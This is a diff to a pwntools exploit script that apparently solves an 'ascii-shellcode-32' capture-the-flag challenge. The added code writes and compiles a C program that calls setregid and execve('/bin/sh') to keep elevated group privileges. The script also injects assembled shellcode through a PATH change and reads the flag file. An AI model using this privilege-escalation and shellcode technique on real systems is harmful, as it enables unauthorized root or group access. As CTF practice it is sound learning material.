@@ -1,4 +1,19 @@
 from pwn import *
+import os
+
+c_code = '''
+#include <unistd.h>
+int main() {
+    setregid(getegid(), getegid());
+    execve("/bin/sh", 0, 0);
+}
+'''
+
+with open("payload.c", "w") as f:
+    f.write(c_code)
+
+os.system("gcc -o z payload.c")
+
 
 shellcode = asm('''
 push   eax
@@ -38,4 +53,8 @@ with open('shellcode.bin', 'wb') as f:
 io = process("ascii-shellcode-32", env={"PATH":"$PATH:."})
 
 
-io.interactive()
+import re
+io.sendlineafter(b'Reading', b'cat flag')
+flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
+print(flag)
+
